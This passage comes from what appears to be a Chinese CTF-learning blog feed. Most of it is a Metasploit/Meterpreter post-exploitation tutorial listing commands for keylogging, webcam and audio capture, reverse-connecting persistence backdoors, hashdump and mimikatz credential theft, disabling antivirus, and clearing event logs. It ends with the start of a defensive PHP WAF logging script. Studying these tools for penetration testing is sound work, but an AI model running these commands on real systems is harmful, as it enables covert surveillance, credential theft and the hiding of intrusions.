进程，没有关闭可使用  <code>kill pid</code>  命令关闭进程。</p>\n</li>\n<li class=\"lvl-2\">\n<p>或者使用自动迁移进程（ <code>run post/windows/manage/migrate</code> ）命令，系统会自动寻找合适的进程然后迁移。</p>\n</li>\n</ul>\n</div>\n<div class=\"tab\" data-id=\"id2\" data-title=\"[可能的意外].\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-2\">\n<p>被绑进程级别太高，如 explorer.exe 吧，虽然它一定存在，但你真的不一定能捆上它，试着换点权限低的进程吧。</p>\n</li>\n<li class=\"lvl-2\">\n<p>即使你捆到了正常的进程，你能保证它下次运行时正常启着动么？在测试中仗着免杀捆到了 QQ 电脑管家的子进程上，结果在重启是，QQ 电脑管家在启动时貌似对启动项进行了检查，最终 QQ 电脑管家报错，未能正常启动，当然，我们的木马也就凉了。</p>\n</li>\n<li class=\"lvl-2\">\n<p>不要认为迁移进程操作是一个多么低权限随意的工作，强烈建议在此之前请做更初级的信息搜集工作，以保你此行至少不是空手而归。包括 migrate 在内，大量高权限命令或上传下载大体积文件命令都会因为双方网络质量等原因导致会话死亡，没有听错，不是完全断开，但不会再有回应。</p>\n</li>\n<li class=\"lvl-2\">\n<p>目标 PC 环境对木马功能影响很大，要记住，就算是 win10 也有被打开摄像头和麦的情况，就算是 winXP 也有 ps 不出来东西的情况</p>\n<p>From <a href=\"https://www.freebuf.com/articles/web/203009.html\">Metasploit 入门系列 (十)——Meterpreter (三) - FreeBuf 网络安全行业门户</a></p>\n</li>\n</ul>\n</div>\n</div></details>\n<h2 id=\"远程桌面\"><a class=\"anchor\" href=\"#远程桌面\">#</a> 远程桌面</h2>\n<p>靶机为 windows 时使用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run getgui <span class=\"token parameter variable\">-e</span>                <span class=\"token comment\"># 开启远程桌面</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>enumdesktops                 <span class=\"token comment\"># 查看可用的桌面</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>getdesktop                   <span class=\"token comment\"># 获取当前 meterpreter 关联的桌面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>set_desktop                  <span class=\"token comment\"># 设置 meterpreter 关联的桌面  -h 查看帮助</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>screenshot                   <span class=\"token comment\"># 截屏</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>use espia                    <span class=\"token comment\"># 或者使用 espia 模块截屏  然后输入 screengrab</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run vnc                      <span class=\"token comment\"># 使用 vnc 远程桌面连接，(这方法有点问题，上传了 exe 但是启动不了)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>run sound_recorder           <span class=\"token comment\"># 声音记录</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run webcam                   <span class=\"token comment\"># 开启摄像头</span></pre></td></tr></table></figure><h2 id=\"键盘-摄像头窃取\"><a class=\"anchor\" href=\"#键盘-摄像头窃取\">#</a> 键盘、摄像头窃取</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>keyscan_start                    <span class=\"token comment\"># 开始键盘记录</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>keyscan_dump                     <span class=\"token comment\"># 导出记录数据</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>keyscan_stop                     <span class=\"token comment\"># 结束键盘记录</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>uictl  disable<span class=\"token punctuation\">(</span>enable<span class=\"token punctuation\">)</span> keyboard  <span class=\"token comment\"># 禁止 (允许) 目标使用键盘</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>uictl  disable<span class=\"token punctuation\">(</span>enable<span class=\"token punctuation\">)</span> mouse     <span class=\"token comment\"># 禁止 (允许) 目标使用鼠标</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>webcam_list                      <span class=\"token comment\"># 获取目标系统的摄像头列表</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>webcam_snap                      <span class=\"token comment\"># 从指定的摄像头，拍摄照片</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>webcam_stream                    <span class=\"token comment\"># 从指定的摄像头，开启视频</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run vnc                          <span class=\"token comment\"># 屏幕实时监控。</span></pre></td></tr></table></figure><h2 id=\"植入后门\"><a class=\"anchor\" href=\"#植入后门\">#</a> 植入后门</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run persistence –h               <span class=\"token comment\"># 查看帮助</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run persistence <span class=\"token parameter variable\">-X</span> <span class=\"token parameter variable\">-i</span> <span class=\"token number\">5</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">4444</span> <span class=\"token parameter variable\">-r</span> <span class=\"token number\">192.168</span>.81.129</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># -X 指定启动的方式为开机自启动；-i 反向连接的时间间隔；–r 指定攻击者的 ip</span></pre></td></tr></table></figure><h2 id=\"运行靶机程序\"><a class=\"anchor\" href=\"#运行靶机程序\">#</a> 运行靶机程序</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># execute 命令用法：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>execute <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> <span class=\"token parameter variable\">-f</span> 指定的可执行文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-f：指定可执行文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-H：创建一个隐藏进程</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-a：传递给命令的参数</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-i：跟进程进行交互</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-m：从内存中执行</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-t：使用当前伪造的线程令牌运行进程</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-s：在给定会话中执行进程</pre></td></tr></table></figure><h2 id=\"添加用户\"><a class=\"anchor\" href=\"#添加用户\">#</a> 添加用户</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run getgui <span class=\"token parameter variable\">-u</span> <span class=\"token operator\">&lt;</span>用户<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>密码<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run getgui <span class=\"token parameter variable\">-u</span> user1 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">123</span>   <span class=\"token comment\"># 添加用户，用户名 user，密码 123</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run getgui <span class=\"token parameter variable\">-f</span> <span class=\"token number\">4444</span> –e        <span class=\"token comment\"># 3389 端口转发到 6661</span></pre></td></tr></table></figure><h2 id=\"生成后门\"><a class=\"anchor\" href=\"#生成后门\">#</a> 生成后门</h2>\n<p><code>meterpreter</code>  是基于 <code>内存DLL</code>  建立的连接，所以，只要目标主机关机，我们的连接就会断。</p>\n<p>这篇写的太好了，直接引用</p>\n<p><a href=\"https://www.cnblogs.com/tomyyyyy/p/15178866.html\">msfvenom—— 木马免杀篇 - tomyyyyy - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_44677409/article/details/96346481\">Metasploit——msfvenom 免杀木马_-f py -o-CSDN 博客</a></p>\n<p><a href=\"https://blog.csdn.net/qq_42094992/article/details/109004560\">MSF 生成后门汇总_msfvenom linux/shell/reverse_tcp-CSDN 博客</a></p>\n<h2 id=\"产后护理\"><a class=\"anchor\" href=\"#产后护理\">#</a> 产后护理</h2>\n<p>攻击的所有操作都被记录在了系统日志文件中，因此我们需要清理日志。</p>\n<pre><code>clearev  #清除事件日志\n</code></pre>\n<h1 id=\"post模块\"><a class=\"anchor\" href=\"#post模块\">#</a> POST 模块</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run killav        <span class=\"token comment\"># 可能导致目标机器蓝屏死机</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run post/windows/gather/enum_computers <span class=\"token comment\"># 枚举域内所有用户，当然这里的目标机不属于任何域。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run persistence   <span class=\"token comment\"># 将 meterpreter 木马写入硬盘，下次开机时自启</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>run post/multi/gather/wlan_geolocate  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 基于 wlan 进行地理位置确认，获得地理信息自动生成 txt 文件保在 /root/.msf6/loot 下（隐藏文件夹）</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>run hashdump                                            <span class=\"token comment\"># 获取目标系统用户密码 hash</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run service_manager                                     <span class=\"token comment\"># 目标系统服务管理，-l 参数常用于信息收集</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>run post/windows/wlan/wlan_profile                      <span class=\"token comment\"># 用于读取目标主机 WiFi 密码。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>run post/windows/manage/migrate                \t\t\t<span class=\"token comment\"># 自动进程迁移</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>run post/windows/gather/checkvm                \t\t\t<span class=\"token comment\"># 查看目标主机是否运行在虚拟机上</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>run post/windows/manage/killav                \t\t\t<span class=\"token comment\"># 关闭杀毒软件</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run post/windows/manage/enable_rdp            \t\t\t<span class=\"token comment\"># 开启远程桌面服务</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>run post/windows/manage/autoroute              \t\t\t<span class=\"token comment\"># 查看路由信息</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>run post/windows/gather/enum_logged_on_users    \t\t<span class=\"token comment\"># 列举当前登录的用户</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>run post/windows/gather/enum_applications       \t\t<span class=\"token comment\"># 列举应用程序</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>run post/windows/gather/credentials/windows_autologin \t<span class=\"token comment\"># 抓取自动登录的用户名和密码</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>run post/windows/gather/smart_hashdump               \t<span class=\"token comment\"># dump 出所有用户的 hash</span></pre></td></tr></table></figure><h2 id=\"获取用户密码\"><a class=\"anchor\" href=\"#获取用户密码\">#</a> 获取用户密码</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run windows/gather/credentials/windows_autologin   <span class=\"token comment\"># 当用户自动登录时抓取密码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>run hashdump  <span class=\"token comment\"># hashdump 模块可以从 SAM 数据库中导出本地用户账号，该命令的使用前 getsystem。</span></pre></td></tr></table></figure><p>导出的数据格式是这样的：</p>\n<pre><code class=\"language-SAM\">用户名:SID:LM哈希:NTLM哈希:::\n</code></pre>\n<p>通过<a href=\"https://www.cmd5.com/?lailu=www.itdka.cn\"> md5 在线解密破解，md5 解密加密 (cmd5.com)</a> 来查询这些哈希值</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>run windows/gather/smart_hashdump</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 需要系统权限。功能更强大，如果当前用户是域管理员用户，则可以导出域内所有用户的 hash。</span></pre></td></tr></table></figure><p>还可以通过<span class=\"kbd blue\"> kiwi 模块</span>、<span class=\"kbd blue\">mimikatz 模块</span>获取用户密码。</p>\n<h1 id=\"powershell模块\"><a class=\"anchor\" href=\"#powershell模块\">#</a> powershell 模块</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<h1 id=\"kimimimikatz模块\"><a class=\"anchor\" href=\"#kimimimikatz模块\">#</a> kimi（mimikatz）模块</h1>\n<blockquote>\n<p><strong>mimikatz 模块已经合并入 kiwi 模块中</strong></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>creds_all：             <span class=\"token comment\">#列举所有凭据</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>creds_kerberos：        <span class=\"token comment\">#列举所有 kerberos 凭据</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>creds_msv：             <span class=\"token comment\">#列举所有 msv 凭据</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>creds_ssp：             <span class=\"token comment\">#列举所有 ssp 凭据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>creds_tspkg：           <span class=\"token comment\">#列举所有 tspkg 凭据</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>creds_wdigest：         <span class=\"token comment\">#列举所有 wdigest 凭据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dcsync：                <span class=\"token comment\">#通过 DCSync 检索用户帐户信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dcsync_ntlm：           <span class=\"token comment\">#通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>golden_ticket_create：  <span class=\"token comment\">#创建黄金票据</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kerberos_ticket_list：  <span class=\"token comment\">#列举 kerberos 票据</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>kerberos_ticket_purge： <span class=\"token comment\">#清除 kerberos 票据</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>kerberos_ticket_use：   <span class=\"token comment\">#使用 kerberos 票据</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>kiwi_cmd：              <span class=\"token comment\">#执行 mimikatz 的命令，后面接 mimikatz.exe 的命令</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lsa_dump_sam：          <span class=\"token comment\">#dump 出 lsa 的 SAM</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>lsa_dump_secrets：      <span class=\"token comment\">#dump 出 lsa 的密文</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>password_change：       <span class=\"token comment\">#修改密码</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>wifi_list：             <span class=\"token comment\">#列出当前用户的 wifi 配置文件</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>wifi_list_shared：      <span class=\"token comment\">#列出共享 wifi 配置文件 / 编码</span></pre></td></tr></table></figure><p>kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能，该命令后面接 mimikatz.exe 的命令:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kiwi_cmd sekurlsa::logonpasswords</pre></td></tr></table></figure><h1 id=\"stdapi模块\"><a class=\"anchor\" href=\"#stdapi模块\">#</a> stdapi 模块</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<h1 id=\"令牌假冒\"><a class=\"anchor\" href=\"#令牌假冒\">#</a> 令牌假冒</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<h1 id=\"pivot代理\"><a class=\"anchor\" href=\"#pivot代理\">#</a> pivot 代理</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<p><a href=\"https://www.cnblogs.com/diligenceday/p/11028462.html\">超实用！手把手教你如何用 MSF 进行后渗透测试！ - 方方和圆圆 - 博客园 (cnblogs.com)</a></p>\n<h1 id=\"自定义攻击模块\"><a class=\"anchor\" href=\"#自定义攻击模块\">#</a> 自定义攻击模块</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<p><mark><strong>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。</strong></mark></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>我们也可以将攻击代码写入 <code>configure.rc</code> （只要是以 <code>.rc</code>  结尾的文件）配置文件中，</p>\n</li>\n<li class=\"lvl-2\">\n<p>然后使用命令 <code>msfconsole -r configure.rc</code>  进行自动攻击</p>\n<p>参考这篇文章<a href=\"https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501\">【漏洞复现】RDP 远程桌面漏洞复现 (CVE-2019-0708)_exploit/cve-2019-0708-CSDN 博客</a></p>\n</li>\n</ul>\n<h1 id=\"小试牛刀\"><a class=\"anchor\" href=\"#小试牛刀\">#</a> 小试牛刀</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<h1 id=\"msf-gui图形化界面\"><a class=\"anchor\" href=\"#msf-gui图形化界面\">#</a> MSF-GUI 图形化界面</h1>\n<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>\n<p>安装教程<a href=\"https://www.yuque.com/vipersec/install/olg1ua\">首次安装 (yuque.com)</a></p>\n<p>用安装教程脚本自动化安装可以不用繁琐的手动部署，也可以不用 git clone。懒人就要懒到极致。</p>\n<p><span class=\"spoiler\" title=\"你知道得太多了\">还没用过，看着好屌。</span></p>\n<p>项目地址：<a href=\"https://github.com/FunnyWolf/Viper\">FunnyWolf/Viper: Attack Surface Management &amp; Red Team Simulation Platform 互联网攻击面管理 &amp; 红队模拟平台 (github.com)</a></p>\n<h1 id=\"with-powers-comes-responsilities\"><a class=\"anchor\" href=\"#with-powers-comes-responsilities\">#</a> With Powers Comes Responsilities</h1>\n<h2 id=\"metasploit的强大\"><a class=\"anchor\" href=\"#metasploit的强大\">#</a> Metasploit 的强大</h2>\n<p>初步学习完 Metasploit 感觉到它的强大之处，会不会有当 GPT 学会 msf 之后乱杀世界一切生灵的惶恐？或许我才意识到这就是网安人的使命吧。</p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg\" alt=\"With Great Power Comes Great Responsibilities\" /></p>\n<p>与君共勉。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<p><a href=\"http://t.csdnimg.cn/mxbtk\">http://t.csdnimg.cn/mxbtk</a></p>\n<p><a href=\"http://t.csdnimg.cn/PPj38\">http://t.csdnimg.cn/PPj38</a></p>\n<p><a href=\"http://t.csdnimg.cn/ucKKL\">http://t.csdnimg.cn/ucKKL</a></p>\n<p><a href=\"https://blog.csdn.net/qq_43307937/article/details/109701503\">Meterpreter 的常用命令合集_meterpreter 命令大全 - CSDN 博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501\">【工具使用】——MSF 使用_使用 MSF 抓取用户密码_msf 读取 windows 密码 - CSDN 博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119497964\">【工具使用】——MSF 使用_MSF 中 kiwi (mimikatz) 模块的使用_load kiwi-CSDN 博客</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_45588247/article/details/119614618#t13\">【工具使用】——Metasploit (MSF) 使用详解 (超详细)-CSDN 博客</a></p>\n<p><a href=\"https://www.freebuf.com/column/203008.html\">Metasploit 入门系列 (九)——Meterpreter (二) - FreeBuf 网络安全行业门户</a></p>\n<p><a href=\"https://www.cnblogs.com/dogecheng/p/11478953.html\">MSF——Payload 模块（二） - 那少年和狗 - 博客园 (cnblogs.com)</a></p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/",
            "url": "https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/",
            "title": "AWD-waf脚本",
            "date_published": "2024-04-19T13:32:39.640Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-19</span><br />\n 脚本收集自网络，线下比赛可能不允许通防，准备了两个易于包含的 waf</p>\n<h1 id=\"php-waf脚本\"><a class=\"anchor\" href=\"#php-waf脚本\">#</a> php waf 脚本</h1>\n<div class=\"note success\">\n<div class=\"tab\" data-id=\"id1\" data-title=\"waf脚本1\">\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$log_file_path</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./log.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$blackIp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'192.168.43.150'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * [access 日志记录模块]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @return [type] [description]</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">access</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$log_file_path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token operator\">!=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"contents\"</span><span class=\"token operator\">=></span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token variable\">$flow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Userip'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Path'</span> <span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SERVER_PORT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REQUEST_URI\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Post'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Cookie'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Time'</span><span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-s h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token variable\">$flow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Userip'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Path'</span> <span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SERVER_PORT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REQUEST_URI\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Post'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Cookie'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'Time'</span><span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-s h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token 